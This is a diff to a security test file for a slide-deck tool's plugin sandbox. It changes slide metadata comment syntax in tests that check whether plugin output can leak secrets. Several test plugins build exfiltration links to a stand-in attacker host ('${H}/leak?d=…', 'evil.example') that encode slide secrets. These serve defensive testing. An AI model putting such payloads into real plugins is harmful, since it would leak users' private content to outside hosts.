@@ -180,7 +180,7 @@ describe('the fence door through the real sandbox', () => {
 
   test('CLAIMED: a fence on a slide a code package claims whole is not run', { timeout: TIMEOUT }, async () => {
     hits = [];
-    const md = '---\ntheme: indaco\n---\n\n<!-- _class: tally -->\n\n## Claimed\n\n```gantt\nnot run\n```\n';
+    const md = '---\ntheme: indaco\n---\n\n<!-- @meta{class=tally} -->\n\n## Claimed\n\n```gantt\nnot run\n```\n';
     const p = plugin(hostile(H, P));
     approve(p);
     const tally = { name: 'tally', code: 'function t(s){return s.html}\nexport { t as default };', facts: 1 };
@@ -229,7 +229,7 @@ describe('the fence door through the real sandbox', () => {
   });
 
   test('A COMPONENT AND A PLUGIN OF ONE NAME are two packages: each runs its own code, each needs its own approval', { timeout: TIMEOUT }, () => {
-    const md = '---\ntheme: indaco\n---\n\n<!-- _class: same -->\n\n## Slide\n\n- 1\n\n---\n\n## Fence\n\n```gantt\nrows\n```\n';
+    const md = '---\ntheme: indaco\n---\n\n<!-- @meta{class=same} -->\n\n## Slide\n\n- 1\n\n---\n\n## Fence\n\n```gantt\nrows\n```\n';
     const comp = { name: 'same', code: 'function t(s){return s.html.replace("<li>1</li>","<li>COMPONENT</li>")}\nexport { t as default };', facts: 1 };
     const plug = plugin('function render(f){return "<p>PLUGIN "+f.body.trim()+"</p>"}\nexport { render as default };', { name: 'same' });
     grantTrust('component', 'same', codeDigest({ roles: { 'transform.js': 't' }, files: { t: comp.code } }), { layer: null });
@@ -259,7 +259,7 @@ describe('the fence door through the real sandbox', () => {
     // (`qr` turns a bullet into a code). Every reader now masks `[data-lattice-plugin]` (spec/LPM.md §10), so the plugin
     // draws, and its `qr`- and `url`-keyed bullets aimed at the listener are text. Slide 2 has no link of the author's:
     // a pass that read plugin text would encode the plugin's.
-    const md = '---\ntheme: indaco\n---\n\n<!-- _class: closing qr -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n\n---\n\n<!-- _class: closing qr -->\n\n## No link of the author\'s\n\n```gantt\nSECRET-Q4\n```\n';
+    const md = '---\ntheme: indaco\n---\n\n<!-- @meta{layout=closing, class=qr} -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n\n---\n\n<!-- @meta{layout=closing, class=qr} -->\n\n## No link of the author\'s\n\n```gantt\nSECRET-Q4\n```\n';
     const p = plugin(`function render(f){var u="${H}/leak?d="+encodeURIComponent(f.body);return "<ul><li>"+u+"</li><li>"+u+" <code>qr</code></li><li>"+u+" <code>url</code></li></ul>"}\nexport { render as default };`);
     approve(p);
     const r = run(p, md);
@@ -284,7 +284,7 @@ describe('the fence door through the real sandbox', () => {
     // The red team, 2026-11-09: an `<li>` start tag closes the author's open item, walking past the plugin's root <div>, so
     // the plugin's URL became a top-level bullet of the author's list, outside `[data-lattice-plugin]`, and the runtime's `qr`
     // pass encoded it. `doorFinishFence` refuses an orphan `<li>`/`<dd>`/`<dt>` (lib/core/door-attr.mjs).
-    const md = '---\ntheme: indaco\n---\n\n<!-- _class: closing qr -->\n\n## Thanks\n\n- Our plan:\n\n  ```gantt\n  SECRET-Q4\n  ```\n';
+    const md = '---\ntheme: indaco\n---\n\n<!-- @meta{layout=closing, class=qr} -->\n\n## Thanks\n\n- Our plan:\n\n  ```gantt\n  SECRET-Q4\n  ```\n';
     const p = plugin(`function render(f){return "<span>chart</span><li>${H}/leak?d="+encodeURIComponent(f.body.trim())+"</li>"}\nexport { render as default };`);
     approve(p);
     const r = run(p, md);
@@ -301,7 +301,7 @@ describe('the fence door through the real sandbox', () => {
     hits = [];
     // Flipped from "the plugin never drew" (when the `video` pass read the slide's bullets): the address now comes only from the
     // author's `@video{…}` span, so there is nothing for a plugin's text to be mistaken for (engineering/decisions/2026-10-16-media-plugins.md § 4.5).
-    const md = '---\ntheme: indaco\n---\n\n<!-- _class: video qr -->\n\n## Clip\n\n`@video{"https://www.youtube.com/watch?v=dQw4w9WgXcQ"}`\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n';
+    const md = '---\ntheme: indaco\n---\n\n<!-- @meta{layout=video, class=qr} -->\n\n## Clip\n\n`@video{"https://www.youtube.com/watch?v=dQw4w9WgXcQ"}`\n\n```gantt\nSECRET-Q3-NUMBERS\n```\n';
     const p = plugin(`function render(f){return "<ul><li>https://evil.example/leak?d="+encodeURIComponent(f.body)+" <code>poster</code></li></ul><p><code>@video{\\"https://youtu.be/AAAAAAAAAAA\\"}</code></p>"}\nexport { render as default };`);
     approve(p);
     const r = run(p, md);
@@ -391,7 +391,7 @@ describe('the attack through the REAL CLI export, with a network log (spec/LPM.m
     fs.writeFileSync(path.join(dir, 'gantt-plugin.docs.md'), '# gantt-plugin\n');
     fs.writeFileSync(path.join(dir, 'gantt-plugin.fixtures.md'), '```gantt\nA 1\n```\n');
     fs.writeFileSync(path.join(dir, 'gantt-plugin.render.js'), `function render(f){var u="${H}/leak?d="+encodeURIComponent(f.body);return "<ul><li>"+u+"</li><li>"+u+" <code>qr</code></li><li>"+u+" <code>url</code></li></ul>"}\nexport { render as default };\n`);
-    fs.writeFileSync(path.join(work, 'deck.md'), '---\ntheme: indaco\nplugins: [gantt-plugin]\n---\n\n<!-- _class: closing qr -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3\n```\n\n---\n\n<!-- _class: closing qr -->\n\n## No link of the author\'s\n\n```gantt\nSECRET-Q4\n```\n');
+    fs.writeFileSync(path.join(work, 'deck.md'), '---\ntheme: indaco\nplugins: [gantt-plugin]\n---\n\n<!-- @meta{layout=closing, class=qr} -->\n\n## Clip\n\n- https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n```gantt\nSECRET-Q3\n```\n\n---\n\n<!-- @meta{layout=closing, class=qr} -->\n\n## No link of the author\'s\n\n```gantt\nSECRET-Q4\n```\n');
     for (const args of [['packages', 'add', dir], ['packages', 'trust', 'plugin/gantt-plugin', '--yes']]) {
       const r = await lattice(...args);
       assert.equal(r.code, 0, r.out);
